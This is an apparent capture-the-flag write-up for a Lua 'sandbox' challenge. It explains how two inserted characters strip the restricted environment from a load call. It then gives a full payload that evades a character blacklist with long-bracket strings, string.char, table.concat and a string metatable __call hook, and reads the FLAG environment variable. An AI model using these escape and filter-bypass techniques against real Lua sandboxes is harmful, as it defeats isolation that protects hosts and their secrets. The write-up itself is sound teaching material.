# lil box

This program evaluates arbitrary code in a "sandbox" using Lua's `load` function.

```lua
load (ld [, source [, mode [, env]]])
```

More specifically, the sandbox comprises of a file `sandbox.lua`:

```lua
assert(load(input, "=input", SANDBOX()))()
```

The `mode` and `env` arguments to `load` being provided by the `SANDBOX` function from `main.lua`:

```
function SANDBOX()
	return "t", { os = {
		clock = os.clock,
		date = os.date,
		difftime = os.difftime,
		time = os.time,
	} }
end
```

You get to insert 2 characters into the `sandbox.lua` part of the jail before it is executed and passed your input.

To escape, add an operation on the `SANDBOX()` part of the call to reduce down the varargs to the first value.

Wrapping the call in parentheses, or a single-character key access like `.a` after both work:

- `(f())` discards extra values from varargs and resulsts in a single `"t"` value, and no `env` argument
- `("t").a`, unlike other data types, returns `nil` instead of erroring, thereby giving neither a `mode` nor a `env` argument

We would then like to execute a payload like `print(os.getenv("FLAG"))`, but `.`, `'`, `"`, `(`, and `)` are forbidden.

We however still have access to strings using `[[ ]]` quotes, indexing using `[ ]`, and function calls using the `f{}` and `f[[]]` (in our case, but could also be `f""` or `f''` in normal circumstances).

`[[]]` quotes ignore escapes, but we you can obtain a string value for one of the banned characters using e.g. `string[ [[char]] ][[34]]`.

To make a larger payload out of smaller parts, using `table[ [[concat]] ]{ ... }`.

To `load` your constructed payload requires some trickery. You can, for example, modify the metatable for strings so that calling a string `load`s it:

```lua
getmetatable[[]] [ [[__call]] ] = load
```

A final payload:
```lua
getmetatable[[]] [ [[__call]] ] = load;
C = string[ [[char]] ];
l = C[[40]]; r = C[[41]]; d = C[[46]]; q = C[[34]];
p = table[ [[concat]] ]{ [[print]], l, [[os]], d, [[getenv]], l, q, [[FLAG]], q, r, r };
p[[]][[]]
```
